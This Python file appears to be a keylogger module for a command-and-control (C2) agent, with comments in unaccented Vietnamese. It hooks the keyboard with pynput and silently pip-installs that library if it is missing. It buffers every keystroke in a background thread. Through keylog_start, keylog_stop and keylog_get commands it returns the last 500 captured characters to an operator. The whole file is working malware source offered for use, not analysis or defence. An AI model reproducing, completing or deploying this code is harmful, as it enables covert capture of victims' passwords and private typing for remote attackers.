"""C2 Agent - Keylogger Module
Su dung: keylog_start | keylog_stop | keylog_get
Can pynput: pip install pynput (tu dong cai neu chua co)
"""
import threading, time, json, os, sys, subprocess

_buffer = []
_running = False
_thread = None

def _install_pynput():
    try:
        import pynput
        return True
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "--quiet"])
        return False

def _hook():
    global _buffer, _running
    try:
        from pynput import keyboard
    except ImportError:
        return

    def on_press(key):
        global _buffer
        try:
            if hasattr(key, 'char') and key.char is not None:
                _buffer.append(key.char)
            elif key == keyboard.Key.space:
                _buffer.append(' ')
            elif key == keyboard.Key.enter:
                _buffer.append('\n')
            elif key == keyboard.Key.tab:
                _buffer.append('\t')
            elif key == keyboard.Key.backspace and _buffer:
                _buffer.pop()
            elif key == keyboard.Key.esc:
                _buffer.append('[ESC]')
            else:
                k = str(key).replace('Key.', '[')
                if k in ['[shift]', '[ctrl]', '[alt]', '[cmd]']:
                    pass  # bo qua phim modifier
                else:
                    _buffer.append(f'<{k}>')
        except:
            pass

    with keyboard.Listener(on_press=on_press) as listener:
        _running = True
        listener.join()
    _running = False

def start():
    global _thread, _running, _buffer
    if _running:
        return {"output": "[KEYLOG] Dang chay roi", "exit_code": 0}
    _buffer = []
    if not _install_pynput():
        return {"output": "[KEYLOG] Loi cai pynput", "exit_code": -1}
    _thread = threading.Thread(target=_hook, daemon=True)
    _thread.start()
    time.sleep(1)
    return {"output": "[KEYLOG] Da bat dau ghi phim!", "exit_code": 0}

def stop():
    global _running, _thread
    if not _running:
        return {"output": "[KEYLOG] Chua chay", "exit_code": 0}
    _running = False
    # Listener.stop() duoc goi khi _running = False
    return {"output": "[KEYLOG] Da dung ghi", "exit_code": 0}

def get_log():
    global _buffer
    text = ''.join(_buffer)
    if not text:
        return {"output": "[KEYLOG] Chua co du lieu", "exit_code": 0}
    # Tra ve 500 ky tu gan nhat
    if len(text) > 500:
        text = text[-500:]
        text = f"...(bo qua {len(''.join(_buffer))-500} ky tu)...\n{text}"
    _buffer = []  # Xoa sau khi lay
    return {"output": f"[KEYLOG] Du lieu ghi nhan:\n{text}", "exit_code": 0}

def handle(cmd):
    cmd = cmd.strip().lower()
    if cmd == "keylog_start":
        return start()
    elif cmd == "keylog_stop":
        return stop()
    elif cmd == "keylog_get":
        return get_log()
    return None
